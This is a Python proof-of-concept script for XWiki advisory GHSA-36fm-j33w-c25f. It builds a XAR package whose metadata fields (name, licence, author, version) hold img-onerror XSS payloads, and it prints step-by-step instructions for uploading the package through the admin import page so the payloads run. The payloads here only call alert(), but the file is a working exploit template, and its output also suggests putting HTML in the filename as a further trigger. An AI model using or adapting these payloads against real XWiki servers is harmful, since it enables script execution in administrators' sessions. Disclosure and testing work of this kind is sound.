#!/usr/bin/env python3
"""
GHSA-36fm-j33w-c25f — Create a malicious XAR file with XSS payloads.

A XAR file is a ZIP archive containing:
  - package.xml  (package metadata — name, version, author, licence)
  - One or more wiki page XML files

This script creates a XAR where every metadata field in package.xml
contains an HTML/JS payload. When imported via XWiki's admin UI, the
vulnerable import.js renders these fields via Prototype.js .update()
(innerHTML), executing the attacker's JavaScript in the admin's session.

Usage:
    python3 create_malicious_xar.py

Output:
    xss-payload.xar  — upload this to XWiki admin > Content > Import
"""

import zipfile
import os

PACKAGE_XML = """\
<?xml version="1.0" encoding="UTF-8"?>

<package>
  <infos>
    <name><![CDATA[<img src=x onerror="alert('XSS-name')">Malicious Package]]></name>
    <description>A package with XSS payloads in metadata fields</description>
    <licence><![CDATA[<img src=x onerror="alert('XSS-licence')">LGPL]]></licence>
    <author><![CDATA[<img src=x onerror="alert('XSS-author')">xwiki:XWiki.Admin]]></author>
    <version><![CDATA[<img src=x onerror="alert('XSS-version')">1.0]]></version>
    <backupPack>true</backupPack>
    <preserveVersion>true</preserveVersion>
  </infos>
  <files>
    <file defaultAction="0" language="">XWiki.XSSTestPage</file>
  </files>
</package>
"""

# Minimal wiki page XML — just enough to be a valid XAR entry
PAGE_XML = """\
<?xml version="1.0" encoding="UTF-8"?>

<xwikidoc version="1.5" reference="XWiki.XSSTestPage" locale="">
  <web>XWiki</web>
  <name>XSSTestPage</name>
  <language/>
  <defaultLanguage/>
  <translation>0</translation>
  <creator>xwiki:XWiki.Admin</creator>
  <parent/>
  <author>xwiki:XWiki.Admin</author>
  <contentAuthor>xwiki:XWiki.Admin</contentAuthor>
  <version>1.1</version>
  <title>XSS Test Page</title>
  <comment/>
  <minorEdit>false</minorEdit>
  <syntaxId>xwiki/2.1</syntaxId>
  <hidden>false</hidden>
  <content>This is a harmless test page.</content>
</xwikidoc>
"""

def main():
    output_dir = os.path.dirname(os.path.abspath(__file__))
    xar_path = os.path.join(output_dir, "xss-payload.xar")

    with zipfile.ZipFile(xar_path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("package.xml", PACKAGE_XML)
        zf.writestr("XWiki/XSSTestPage.xml", PAGE_XML)

    print(f"Created: {xar_path}")
    print(f"Size: {os.path.getsize(xar_path)} bytes")
    print()
    print("To exploit:")
    print("  1. Log in as admin to XWiki")
    print("  2. Go to Administration > Content > Import")
    print("  3. Upload xss-payload.xar")
    print("  4. Click the package name to view its contents")
    print("  5. Observe alert() popups from XSS payloads in name/version/author/licence fields")
    print()
    print("The filename itself is also rendered via .update() (innerHTML).")
    print("Renaming the XAR to contain HTML would also trigger XSS in the filename display.")

if __name__ == "__main__":
    main()
